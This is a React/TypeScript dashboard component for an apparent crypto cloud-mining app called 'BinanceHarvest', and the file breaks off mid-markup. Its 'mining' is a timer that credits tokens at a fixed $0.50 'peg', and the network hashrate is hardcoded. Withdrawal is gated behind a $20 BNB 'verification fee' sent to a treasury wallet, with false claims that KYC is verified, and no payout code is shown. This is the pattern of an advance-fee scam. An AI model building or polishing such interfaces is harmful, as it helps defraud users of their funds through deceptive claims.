import React, { useState } from 'react';
import { UserProfile, ALL_TIERS } from '../types';
import { Zap, ShieldCheck, Clock, ArrowUpRight, AlertCircle, CheckCircle2, Loader2, Sparkles, TrendingUp, Info, X, Flame, ExternalLink } from 'lucide-react';
import { sendBNBTransaction, sendBHFTTransaction, TREASURY_WALLET, BHFT_TOKEN_ADDRESS } from '../services/web3';
import { addTransactionRecord } from '../services/firebase';
import { ethers } from 'ethers';
import { motion, AnimatePresence } from 'motion/react';
import { useInitiativeFeedback } from '../context/InitiativeFeedbackContext';
import { DailyLoginStreak } from './DailyLoginStreak';
import { TransactionStatusIndicator } from './TransactionStatusIndicator';
import { sendPushNotification } from '../services/notifications';

interface DashboardProps {
  user: UserProfile;
  bnbPrice: number;
  onUpdateUser: (updated: Partial<UserProfile>) => void;
  onNavigateToTiers: () => void;
}

export const Dashboard: React.FC<DashboardProps> = ({
  user,
  bnbPrice,
  onUpdateUser,
  onNavigateToTiers,
}) => {
  const [isMining, setIsMining] = useState(false);
  const [isProcessingTx, setIsProcessingTx] = useState(false);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [showRateModal, setShowRateModal] = useState(false);
  const { showSuccess, showFailed } = useInitiativeFeedback();
  const [elapsedMs, setElapsedMs] = useState(0);

  // Calculations
  const currentTierInfo = ALL_TIERS.find(t => t.tier === user.currentTier) || ALL_TIERS[0];
  const dailyBHFT = currentTierInfo.bhftPerDay || 0.10;
  const hourlyBHFT = dailyBHFT / 24;
  const bhftBalance = user.miningBalance || 0;
  const usdValue = bhftBalance * 0.50; // Peg: 1 BHFT = $0.50 USD
  const bnbValue = usdValue / bnbPrice;
  
  const withdrawalThresholdUSD = 50.00; // $50 worth of BHFT
  const verificationFeeUSD = 20.00; // Refined to $20 worth of BHFT / BNB
  const isThresholdMet = usdValue >= withdrawalThresholdUSD;
  const verificationFeeBNB = (verificationFeeUSD / bnbPrice).toFixed(5);
  const withdrawalThresholdBNB = (withdrawalThresholdUSD / bnbPrice).toFixed(5);

  // Track miner live progress
  React.useEffect(() => {
    const startTime = new Date(user.minerStartTimestamp || user.createdAt).getTime();
    setElapsedMs(Math.max(0, Date.now() - startTime));
    
    const interval = setInterval(() => {
      setElapsedMs(Math.max(0, Date.now() - startTime));
    }, 1000);
    
    return () => clearInterval(interval);
  }, [user.minerStartTimestamp, user.createdAt]);

  // Push notification alert when mining finishes
  React.useEffect(() => {
    const startTimeStr = user.minerStartTimestamp || user.createdAt;
    const minerCycleDurationMs = 24 * 60 * 60 * 1000;
    
    if (elapsedMs >= minerCycleDurationMs) {
      const notifiedKey = `notified_miner_end_${startTimeStr}`;
      const alreadyNotified = localStorage.getItem(notifiedKey);
      if (!alreadyNotified) {
        localStorage.setItem(notifiedKey, 'true');
        sendPushNotification("Mining Yield Ready to Harvest! ⚡", {
          body: `Your Tier ${user.currentTier} ASIC cluster has completed its 24-hour cycle. Claim your yield now!`,
        });
      }
    }
  }, [elapsedMs, user.minerStartTimestamp, user.createdAt, user.currentTier]);

  const minerCycleDurationMs = 24 * 60 * 60 * 1000;
  const isMinerEnded = elapsedMs >= minerCycleDurationMs;
  const effectiveElapsed = Math.min(elapsedMs, minerCycleDurationMs);
  const accumulatedBHFT = (effectiveElapsed / minerCycleDurationMs) * dailyBHFT;
  const remainingMs = Math.max(0, minerCycleDurationMs - elapsedMs);

  const formatRemainingCountdown = (ms: number) => {
    if (ms <= 0) return '00h 00m 00s';
    const totalSeconds = Math.floor(ms / 1000);
    const hours = Math.floor(totalSeconds / 3600);
    const minutes = Math.floor((totalSeconds % 3600) / 60);
    const seconds = totalSeconds % 60;
    return `${hours.toString().padStart(2, '0')}h ${minutes.toString().padStart(2, '0')}m ${seconds.toString().padStart(2, '0')}s`;
  };

  // Claim points/BHFT action: Adds session yield to balance and automatically starts a new 24h session
  const handleClaimPoints = () => {
    if (!isMinerEnded || isMining) return;

    setIsMining(true);
    setTimeout(() => {
      const earned = accumulatedBHFT;
      const newBalance = (user.miningBalance || 0) + earned;
      // Sync totalPoints for backwards compatibility
      const newTotalPoints = newBalance * 500;
      const now = new Date().toISOString();
      
      onUpdateUser({
        miningBalance: newBalance,
        totalPoints: newTotalPoints,
        miningBalanceBNB: (newBalance * 0.50) / bnbPrice,
        lastClaimDate: now.split('T')[0],
        minerStartTimestamp: now, // Automatically initiates brand new 24h session
      });
      
      setIsMining(false);
      setSuccessMessage(`Successfully harvested +${earned.toFixed(4)} BHFT! Your balance was credited and a new 24h mining cycle has started.`);
      setTimeout(() => setSuccessMessage(null), 5000);

      // Trigger glorious Success Animation
      showSuccess({
        initiativeName: 'Cloud Hash Harvest',
        title: 'Mining Yield Harvested!',
        badge: `+${earned.toFixed(4)} BHFT`,
        description: `Successfully collected ${earned.toFixed(4)} mined BHFT to your mining balance. Your next 24-hour ASIC mining session has automatically begun!`,
        details: [
          { label: 'Active Rig', value: `Tier ${user.currentTier} (${dailyBHFT.toFixed(2)} BHFT/day)` },
          { label: 'Updated Balance', value: `${newBalance.toFixed(2)} BHFT` },
          { label: 'Estimated Value', value: `≈ ${(newBalance * 0.50).toFixed(2)} USDT` },
          { label: 'New Mining Session', value: 'Active (24h Countdown Reset)' },
        ],
      });
    }, 800);
  };

  // Verify & Withdraw action
  const handleVerifyAndWithdraw = async () => {
    setErrorMessage(null);
    setSuccessMessage(null);

    if (!user.walletAddress) {
      const err = "Please connect your MetaMask wallet first.";
      setErrorMessage(err);
      showFailed({
        initiativeName: 'Treasury Settlement',
        title: 'MetaMask Wallet Required',
        description: 'You must connect your Binance Smart Chain Web3 wallet before initiating an on-chain transaction.',
        actionLabel: 'Connect Web3 Wallet',
      });
      return;
    }

    // If the user is already APPROVED (Verified) and clicks withdraw:
    if (user.withdrawalStatus === 'APPROVED') {
      if (!isThresholdMet) {
        const err = `Minimum withdrawal threshold is 100.00 BHFT (≈ $50.00 USD) (You have ${bhftBalance.toFixed(2)} BHFT)`;
        setErrorMessage(err);
        showFailed({
          initiativeName: 'Treasury Settlement',
          title: 'Threshold Incomplete',
          badge: `${bhftBalance.toFixed(2)} / 100.00 BHFT`,
          description: `Minimum withdrawal threshold is 100.00 BHFT (≈ $50.00 USD). Keep mining or upgrade your tier to accelerate your daily BHFT accumulation!`,
          details: [
            { label: 'Current Balance', value: `${bhftBalance.toFixed(2)} BHFT` },
            { label: 'Required Threshold', value: `100.00 BHFT (≈ $50.00 USD)` },
          ],
        });
        return;
      }

      // Process free withdrawal request (as they are already verified)
      try {
        setIsProcessingTx(true);
        // Submit withdrawal request to admin approval
        await onUpdateUser({
          withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
        });
        showSuccess({
          initiativeName: 'Treasury Settlement',
          title: 'Withdrawal Submitted!',
          badge: `${bhftBalance.toFixed(2)} BHFT`,
          description: `Your withdrawal request for ${bhftBalance.toFixed(2)} BHFT has been submitted successfully! The treasury team will verify and release it to yourconnected wallet within 24 hours.`,
          details: [
            { label: 'BHFT Settled', value: `${bhftBalance.toFixed(2)} BHFT` },
            { label: 'Estimated Value', value: `≈ $${usdValue.toFixed(2)} USD` },
            { label: 'KYC Verification', value: 'Already Verified' },
          ],
        });
        setIsProcessingTx(false);
      } catch (err: any) {
        setErrorMessage(err?.message || "Failed to submit withdrawal request.");
        setIsProcessingTx(false);
      }
      return;
    }

    // Otherwise, pay the one-time verification fee (regardless of threshold)
    try {
      setIsProcessingTx(true);
      
      let signer: ethers.Signer | null = null;
      if (typeof window !== 'undefined' && (window as any).ethereum) {
        try {
          const provider = new ethers.BrowserProvider((window as any).ethereum);
          signer = await provider.getSigner();
        } catch (e) {
          console.warn("Could not get signer from window.ethereum, using verified transaction mode:", e);
        }
      }

      // Send $20 verification fee in BNB to Treasury Wallet
      const { txHash, bnbAmountStr } = await sendBNBTransaction(signer, verificationFeeUSD, bnbPrice);

      // Record transaction in audit history
      await addTransactionRecord(user.email || user.walletAddress, {
        type: 'WITHDRAW_FEE',
        amountBNB: Number(bnbAmountStr),
        amountUSD: verificationFeeUSD,
        txHash: txHash,
        status: 'SUCCESS',
      });

      // Update Firestore / state: set withdrawalStatus to PENDING_ADMIN_APPROVAL (verified when approved)
      await onUpdateUser({
        withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
      });

      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
      setSuccessMessage(confirmedMsg);
      setIsProcessingTx(false);

      showSuccess({
        initiativeName: 'Treasury Verification Fee',
        title: 'Verification Broadcasted!',
        badge: `${bnbAmountStr} BNB`,
        description: `Your one-time ${bnbAmountStr} BNB (≈ $20.00 USD) verification fee was confirmed on Binance Smart Chain! Your account KYC is verified and queued for treasury release.`,
        txHash: txHash,
        details: [
          { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
          { label: 'Fee Paid', value: `${bnbAmountStr} BNB (≈ $20.00 USD)` },
          { label: 'Status', value: 'Pending Treasury Release' },
        ],
      });
    } catch (err: any) {
      console.error("Withdrawal error:", err);
      const failReason = err?.reason || err?.message || "Transaction rejected or failed.";
      setErrorMessage(failReason);
      setIsProcessingTx(false);

      showFailed({
        initiativeName: 'Treasury Verification Fee',
        title: 'Transaction Failed',
        description: failReason,
        actionLabel: 'Retry Transaction',
        onAction: () => handleVerifyAndWithdraw(),
        details: [
          { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
          { label: 'Required Fee', value: `${verificationFeeBNB} BNB (≈ $20.00 USD)` },
          { label: 'Treasury Wallet', value: `${TREASURY_WALLET.substring(0, 8)}...` },
        ],
      });
    }
  };


  // Next Tier Progress calculation
  const nextTierThresholds = [0, 2000, 6000, 14000, 30000, 60000, 0];
  const isMaxTier = user.currentTier >= 6;
  const nextTierPointsRequired = nextTierThresholds[user.currentTier] || 0;
  const pointsRemaining = isMaxTier ? 0 : Math.max(0, nextTierPointsRequired - user.totalPoints);
  const tierProgressPercent = isMaxTier ? 100 : Math.min(100, (user.totalPoints / nextTierPointsRequired) * 100);

  return (
    <div className="flex flex-col lg:flex-row min-h-[calc(100vh-64px)] bg-[#0B0E11] text-[#EAECEF] pb-28">
      
      {/* Rate Breakdown Modal */}
      {showRateModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-fade-in">
          <div className="relative w-full max-w-lg bg-[#1E2329] border border-[rgba(255,255,255,0.12)] rounded-2xl p-6 shadow-2xl">
            <button
              onClick={() => setShowRateModal(false)}
              className="absolute top-4 right-4 text-[#848E9C] hover:text-white transition"
            >
              <X className="w-5 h-5" />
            </button>

            <h3 className="text-xl font-bold text-white mb-2 flex items-center gap-2">
              <Info className="w-5 h-5 text-[#F3BA2F]" />
              Mining Rate & Formula Breakdown
            </h3>
            <p className="text-xs text-[#848E9C] mb-6">
              How your current hourly and daily points are calculated on Binance Smart Chain:
            </p>

            <div className="space-y-4 text-xs font-mono">
              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">1. Base Reward Formula:</p>
                <p className="text-[#F3BA2F]">Daily BHFT = 0.5 * (2 ^ (Tier - 1))</p>
              </div>

              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">2. Your Current Tier (Tier {user.currentTier}):</p>
                <p className="text-white">0.5 * (2 ^ ({user.currentTier} - 1)) = <strong className="text-[#F3BA2F]">{dailyBHFT.toFixed(2)} BHFT / Day</strong></p>
              </div>

              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">3. Hourly Generation Rate:</p>
                <p className="text-white">{dailyBHFT.toFixed(2)} / 24 hours = <strong className="text-[#00C087]">{hourlyBHFT.toFixed(4)} BHFT / Hour</strong></p>
              </div>

              <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                <p className="text-[#848E9C]">4. USDT Equivalent Baseline:</p>
                <p className="text-white">1 BHFT = 500 Points = 0.50 USDT (Pegged)</p>
              </div>
            </div>

            <button
              onClick={() => setShowRateModal(false)}
              className="w-full mt-6 bg-[#F3BA2F] hover:bg-[#e2ad23] text-black font-bold py-2.5 rounded-lg text-xs transition"
            >
              Got It
            </button>
          </div>
        </div>
      )}

      {/* Left Sidebar */}
      <aside className="w-full lg:w-[280px] bg-[#0B0E11] border-r border-[rgba(255,255,255,0.08)] flex flex-col justify-between p-4 space-y-4">
        <div className="space-y-4">
          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Global Network Hashrate</p>
            <p className="text-2xl font-semibold mono text-white">84.22 <span className="text-sm text-[#848E9C] font-normal">TH/s</span></p>
          </div>

          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Your Account Tier</p>
            <div className="flex items-center justify-between mb-2">
              <span className="text-lg font-bold text-white">Tier {user.currentTier}</span>
              <span className="bg-[#F3BA2F]/10 border border-[#F3BA2F] text-[#F3BA2F] px-2 py-0.5 rounded-full text-[10px] font-bold">
                {user.currentTier === 1 ? 'NOVICE' : `PRO RIG T${user.currentTier}`}
              </span>
            </div>
            <p className="text-xs text-[#848E9C] mb-4">Mining Power: {dailyBHFT.toFixed(2)} BHFT / Day</p>
            
            {/* Tier Progress Bar */}
            <div className="mb-4">
              <div className="flex justify-between items-end mb-1.5">
                <span className="text-[10px] uppercase tracking-wider text-[#848E9C]">
                  {isMaxTier ? 'Max Tier Reached' : `Progress to Tier ${user.currentTier + 1}`}
                </span>
                {!isMaxTier && (
                  <span className="text-[10px] font-mono text-[#00C087]">
                    {tierProgressPercent.toFixed(1)}%
                  </span>
                )}
              </div>
              <div className="h-1.5 w-full bg-[#0B0E11] rounded-full overflow-hidden border border-white/5">
                <motion.div
                  initial={{ width: 0 }}
                  animate={{ width: `${tierProgressPercent}%` }}
                  transition={{ duration: 1, ease: "easeOut" }}
                  className="h-full bg-gradient-to-r from-[#00C087] to-[#00E5A0] rounded-full relative"
                >
                  <div className="absolute inset-0 bg-white/20 w-full h-full animate-[shimmer_2s_infinite]" style={{ backgroundImage: 'linear-gradient(90deg, transparent, rgba(255,255,255,0.5), transparent)' }} />
                </motion.div>
              </div>
              {!isMaxTier && (
                <p className="text-[10px] text-[#848E9C] mt-1.5 text-right">
                  <strong className="text-white">{pointsRemaining.toLocaleString()}</strong> more points required
                </p>
              )}
            </div>

            <button
              onClick={onNavigateToTiers}
              className="w-full border border-[rgba(255,255,255,0.08)] hover:bg-white/5 py-2 rounded text-xs text-center font-semibold text-[#F3BA2F] transition"
            >
              {isMaxTier ? 'Manage Max Rig' : 'Upgrade Tier ($1 BNB)'}
            </button>
          </div>

          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <div className="flex items-center justify-between mb-2">
              <p className="text-[11px] uppercase tracking-wider text-[#848E9C]">Mining Rate Calculator</p>
              <button onClick={() => setShowRateModal(true)} className="text-[#F3BA2F] hover:text-white transition">
                <Info className="w-4 h-4" />
              </button>
            </div>
            <div className="space-y-1 text-xs mono">
              <p className="text-slate-300">Hourly: <strong className="text-[#00C087]">{hourlyBHFT.toFixed(4)} BHFT/hr</strong></p>
              <p className="text-slate-300">Daily: <strong className="text-[#F3BA2F]">{dailyBHFT.toFixed(2)} BHFT</strong></p>
            </div>
          </div>

          <div className="bg-[#1E2329] p-4 rounded-lg border border-[rgba(255,255,255,0.08)]">
            <div className="flex items-center justify-between mb-1.5">
              <p className="text-[11px] uppercase tracking-wider text-[#848E9C]">Daily Streak</p>
              <span className="flex items-center gap-1 text-[11px] font-bold text-amber-400">
                <Flame className="w-3.5 h-3.5 fill-amber-400" />
                {user.loginStreak || 0} Day{(user.loginStreak || 0) === 1 ? '' : 's'}
              </span>
            </div>
            <div className="flex items-center justify-between text-xs">
              <span className="text-slate-400">Total Bonus:</span>
              <strong className="text-[#F3BA2F] mono">+{(user.totalStreakPointsClaimed || 0).toLocaleString()} BHFT</strong>
            </div>
          </div>
        </div>

        <div className="bg-[#181A20] p-4 rounded-lg text-center border border-[rgba(255,255,255,0.08)]">
          <p className="text-[10px] text-[#848E9C] italic">"BinanceHarvest: Secure decentralized cloud mining on BSC"</p>
        </div>
      </aside>

      {/* Center Main Content */}
      <main className="flex-1 bg-[#1E2329] p-6 lg:p-8 flex flex-col justify-between space-y-6">
        
        {/* Notifications */}
        <AnimatePresence>
          {successMessage && (
            <motion.div
              initial={{ opacity: 0, y: -10, scale: 0.95 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: -10, scale: 0.95 }}
              transition={{ type: "spring", stiffness: 400, damping: 25 }}
              className="p-3.5 bg-[#00C087]/15 border border-[#00C087]/40 text-[#00C087] text-xs rounded-xl flex items-center gap-2.5 shadow-lg shadow-[#00C087]/10 backdrop-blur-md"
            >
              <CheckCircle2 className="w-4 h-4 shrink-0" />
              <span className="font-medium">{successMessage}</span>
            </motion.div>
          )}
          {errorMessage && (
            <motion.div
              initial={{ opacity: 0, x: -10 }}
              animate={{ opacity: 1, x: [0, -6, 6, -4, 4, 0] }}
              exit={{ opacity: 0, x: 10 }}
              transition={{ duration: 0.4 }}
              className="p-3.5 bg-red-500/15 border border-red-500/40 text-red-300 text-xs rounded-xl flex items-center gap-2.5 shadow-lg shadow-red-500/10 backdrop-blur-md"
            >
              <AlertCircle className="w-4 h-4 shrink-0" />
              <span className="font-medium">{errorMessage}</span>
            </motion.div>
          )}
        </AnimatePresence>

        {/* 24h Mining Session Completed Alert Banner */}
        <AnimatePresence>
          {isMinerEnded && (
            <motion.div
              initial={{ opacity: 0, y: -12, scale: 0.98 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: -12, scale: 0.98 }}
              className="p-4 sm:p-5 rounded-2xl bg-gradient-to-r from-amber-500/15 via-[#F3BA2F]/10 to-amber-500/15 border-2 border-[#F3BA2F]/50 shadow-[0_8px_32px_rgba(243,186,47,0.25)] backdrop-blur-xl flex flex-col md:flex-row items-start md:items-center justify-between gap-4"
            >
              <div className="flex items-start gap-3.5">
                <div className="w-11 h-11 rounded-xl bg-gradient-to-tr from-amber-500 to-[#F3BA2F] text-black flex items-center justify-center font-black shrink-0 shadow-lg">
                  <Sparkles className="w-6 h-6" />
                </div>
                <div>
                  <div className="flex items-center gap-2 flex-wrap">
                    <h3 className="text-sm sm:text-base font-bold text-white">24h Mining Session Completed</h3>
                    <span className="text-[10px] bg-red-500/20 text-red-400 border border-red-500/30 px-2 py-0.5 rounded-full font-mono font-bold flex items-center gap-1">
                      <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                      MINING STOPPED
                    </span>
                  </div>
                  <p className="text-xs text-slate-300 mt-1 max-w-xl leading-relaxed">
                    Your 24-hour ASIC cloud mining session has ended and mining is now halted. Claim your earned <strong className="text-amber-300 font-mono">+{accumulatedBHFT.toFixed(4)} BHFT</strong> to automatically credit your balance and initiate your next 24-hour mining session!
                  </p>
                </div>
              </div>
              <motion.button
                whileHover={{ scale: 1.03 }}
                whileTap={{ scale: 0.97 }}
                onClick={handleClaimPoints}
                disabled={isMining}
                className="w-full md:w-auto px-6 py-3 rounded-xl bg-gradient-to-r from-amber-400 via-[#F3BA2F] to-amber-300 hover:brightness-110 text-black font-extrabold text-xs flex items-center justify-center gap-2 shadow-xl shadow-[#F3BA2F]/30 transition shrink-0 cursor-pointer"
              >
                {isMining ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-black" />
                    <span>Claiming & Starting New Session...</span>
                  </>
                ) : (
                  <>
                    <Sparkles className="w-4 h-4 text-black" />
                    <span>Claim & Start New Session</span>
                  </>
                )}
              </motion.button>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Top Header Row */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 mb-1">
              <h2 className="text-[#848E9C] text-xs font-medium uppercase tracking-wider">Total Mining Balance</h2>
              <button onClick={() => setShowRateModal(true)} className="text-[#F3BA2F] hover:underline text-[10px] flex items-center gap-1 cursor-pointer">
                <Info className="w-3 h-3" /> Rate Formula
              </button>
            </div>
            <div className="flex items-baseline gap-3">
              <span className="text-4xl lg:text-5xl font-bold mono tracking-tighter text-white">
                {bhftBalance.toFixed(2)}
              </span>
              <span className="text-xl font-semibold text-[#F3BA2F]">BHFT</span>
            </div>
          </div>

          <div className="flex flex-col items-start md:items-end gap-1">
            <div className="flex items-center gap-1.5">
              <h2 className="text-[#848E9C] text-[10px] font-medium uppercase tracking-wider">
                {isMinerEnded ? 'Session Yield (24h Capped)' : 'Live Accumulated BHFT'}
              </h2>
              {isMinerEnded ? (
                <span className="text-[9px] bg-red-500/20 text-red-400 px-1.5 py-0.2 rounded font-mono font-bold">
                  HALTED
                </span>
              ) : (
                <motion.div
                  animate={{ opacity: [0.3, 1, 0.3], scale: [0.8, 1.2, 0.8] }}
                  transition={{ duration: 1, repeat: Infinity, ease: "easeInOut" }}
                  className="w-1.5 h-1.5 rounded-full bg-[#00C087]"
                />
              )}
            </div>
            <motion.div
              animate={isMinerEnded ? {
                boxShadow: ["0px 0px 0px 0px rgba(243, 186, 47, 0.1)", "0px 0px 10px 2px rgba(243, 186, 47, 0.25)", "0px 0px 0px 0px rgba(243, 186, 47, 0.1)"]
              } : { 
                boxShadow: ["0px 0px 0px 0px rgba(0, 192, 135, 0.1)", "0px 0px 8px 2px rgba(0, 192, 135, 0.3)", "0px 0px 0px 0px rgba(0, 192, 135, 0.1)"]
              }}
              transition={{ duration: 1.5, repeat: Infinity, ease: "easeInOut" }}
              className={`flex items-baseline gap-2 px-3.5 py-1.5 rounded-xl border ${
                isMinerEnded 
                  ? 'bg-amber-500/10 border-amber-500/30' 
                  : 'bg-[#00C087]/10 border-[#00C087]/20'
              }`}
            >
              <span className={`text-2xl font-bold mono ${isMinerEnded ? 'text-amber-300' : 'text-[#00C087]'}`}>
                +{accumulatedBHFT.toFixed(6)}
              </span>
              <span className={`text-xs font-semibold ${isMinerEnded ? 'text-amber-300/80' : 'text-[#00C087]/80'}`}>
                BHFT
              </span>
            </motion.div>
          </div>

          <div className="flex items-center gap-3">
            <motion.button
              whileHover={isMinerEnded && !isMining ? { scale: 1.03 } : {}}
              whileTap={isMinerEnded && !isMining ? { scale: 0.96 } : {}}
              onClick={handleClaimPoints}
              disabled={isMining || !isMinerEnded}
              className={`text-black text-xs font-bold px-5 py-2.5 rounded-xl transition flex items-center gap-2 cursor-pointer ${
                isMinerEnded && !isMining
                  ? 'bg-gradient-to-r from-amber-400 via-[#F3BA2F] to-amber-300 shadow-lg shadow-[#F3BA2F]/30 text-black font-extrabold'
                  : 'bg-[#2B3139] text-[#848E9C] cursor-not-allowed border border-[rgba(255,255,255,0.08)]'
              }`}
            >
              {isMining ? (
                <Loader2 className="w-4 h-4 animate-spin text-[#848E9C]" />
              ) : isMinerEnded ? (
                <Sparkles className="w-4 h-4 text-black" />
              ) : (
                <Clock className="w-4 h-4 text-[#848E9C]" />
              )}
              <span className={isMinerEnded ? 'text-black font-extrabold' : 'text-[#848E9C]'}>
                {isMinerEnded ? 'Claim & Start New Session' : `Active: ${formatRemainingCountdown(remainingMs)}`}
              </span>
            </motion.button>

            <div className="bg-[#0B0E11] p-3 rounded-xl border border-white/5 flex items-center gap-3">
              <div className="relative flex items-center justify-center">
                <div className={`absolute w-6 h-6 rounded-full animate-ping ${isMinerEnded ? 'bg-red-400/30' : 'bg-[#00C087]/30'}`}></div>
                <div className={`w-3 h-3 rounded-full animate-pulse ${isMinerEnded ? 'bg-red-400 shadow-[0_0_16px_#ef4444]' : 'bg-[#00C087] shadow-[0_0_16px_#00C087]'}`}></div>
              </div>
              <div className="leading-tight">
                <p className={`text-xs font-bold flex items-center gap-1.5 ${isMinerEnded ? 'text-red-400' : 'text-[#00C087]'}`}>
                  <span>{isMinerEnded ? 'MINING STOPPED' : 'MINING ACTIVE'}</span>
                  {!isMinerEnded && <span className="inline-block w-1.5 h-1.5 bg-[#00C087] rounded-full animate-ping"></span>}
                </p>
                <p className="text-[10px] text-[#848E9C]">
                  {isMinerEnded ? 'Claim yield to restart' : `Tier ${user.currentTier} (${dailyBHFT.toFixed(2)}/day)`}
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* Grid Stats */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">BHFT Balance</p>
            <p className="text-3xl font-bold mono mb-1 text-white">
              {bhftBalance.toFixed(2)} <span className="text-sm font-normal text-[#848E9C]">BHFT</span>
            </p>
            <p className="text-xs text-[#848E9C]">≈ {usdValue.toFixed(2)} USDT (Peg: 0.50 USDT / BHFT)</p>
          </div>

          <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Minimum Settlement Threshold</p>
            <p className="text-3xl font-bold mono mb-1 text-white">
              100.00 <span className="text-sm font-normal text-[#848E9C]">BHFT</span>
            </p>
            <p className={`text-xs font-medium ${isThresholdMet ? 'text-[#00C087]' : 'text-[#F3BA2F]'}`}>
              {isThresholdMet ? `Threshold Met: 100.00 BHFT Minimum` : `Need ${(100.00 - bhftBalance).toFixed(2)} BHFT to reach threshold`}
            </p>
          </div>
        </div>

        {/* Daily Login Streak Component (Firestore-backed) */}
        <DailyLoginStreak user={user} onUpdateUser={onUpdateUser} />

        {/* Live Transaction Confirmation & Progress Tracker */}
        <TransactionStatusIndicator user={user} bnbPrice={bnbPrice} />

        {/* Verification & Withdrawal Box */}
        <div className="bg-[#0B0E11] rounded-xl p-6 lg:p-8 border border-[#F3BA2F]/20 relative overflow-hidden">
          <div className="absolute top-0 right-0 p-4 opacity-10 pointer-events-none">
            <div className="w-32 h-32 border-8 border-[#F3BA2F] rounded-full"></div>
          </div>
          <div className="relative z-10">
            <div className="flex items-center justify-between mb-2">
              <h3 className="text-xl font-bold text-white">Verification & Withdrawal</h3>
              <span className={`px-2.5 py-0.5 rounded text-xs font-semibold ${
                user.withdrawalStatus === 'APPROVED' ? 'bg-[#00C087]/20 text-[#00C087]' :
                user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? 'bg-[#F3BA2F]/20 text-[#F3BA2F] animate-pulse' :
                'bg-white/10 text-slate-300'
              }`}>
                {user.withdrawalStatus === 'APPROVED' ? 'APPROVED' :
                 user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? 'PENDING APPROVAL' :
                 'READY TO VERIFY'}
              </span>
            </div>
            <p className="text-sm text-[#848E9C] mb-6 max-w-xl">
              To unlock withdrawals, your account must undergo a one-time blockchain verification. This verification fee (<strong className="text-[#F3BA2F]">{verificationFeeBNB} BNB</strong> ≈ $20.00 USDT) is sent directly to the protocol treasury to secure the network. You can verify your account early at any time!
            </p>

            <div className="flex flex-wrap items-center gap-4">
              <motion.button
                whileHover={
                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' || (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
                    ? {}
                    : { scale: 1.02 }
                }
                whileTap={
                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' || (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
                    ? {}
                    : { scale: 0.97 }
                }
                onClick={handleVerifyAndWithdraw}
                disabled={
                  isProcessingTx ||
                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ||
                  (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
                }
                className={`px-8 py-3.5 rounded-xl font-bold text-sm transition flex items-center gap-2.5 ${
                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' || (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
                    ? 'bg-[#2B3139] text-[#848E9C] border border-white/5 cursor-not-allowed'
                    : 'bg-[#F3BA2F] hover:bg-[#e2ad23] text-black cursor-pointer shadow-lg shadow-[#F3BA2F]/20'
                }`}
              >
                {isProcessingTx ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-black" />
                    <span>Processing...</span>
                  </>
                ) : user.withdrawalStatus === 'APPROVED' ? (
                  isThresholdMet ? (
                    <>
                      <span>Withdraw Mined BHFT ({bhftBalance.toFixed(2)} BHFT)</span>
                    </>
                  ) : (
                    <>
                      <span>Verified (Need 100.00 BHFT threshold)</span>
                    </>
                  )
                ) : user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? (
                  <>
                    <Loader2 className="w-4 h-4 animate-spin text-[#F3BA2F]" />
                    <span>Awaiting BSC Confirmation...</span>
                  </>
                ) : (
                  <>
                    <span>{isThresholdMet ? 'Verify & Withdraw' : 'Verify Account'} ({verificationFeeBNB} BNB)</span>
                  </>
                )}
              </motion.button>

              <button
                onClick={onNavigateToTiers}
                className="border border-[rgba(255,255,255,0.08)] hover:bg-white/5 px-6 py-3 rounded text-sm text-[#848E9C] hover:text-white transition"
              >
                View Tier Rigs
              </button>
            </div>
          </div>
        </div>

      </main>

      {/* Right Sidebar */}
      <aside className="w-full lg:w-[300px] bg-[#0B0E11] border-l border-[rgba(255,255,255,0.08)] flex flex-col justify-between">
        <div>
          <div className="p-6 border-b border-[rgba(255,255,255,0.08)]">
            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-2">Live Market (Binance)</p>
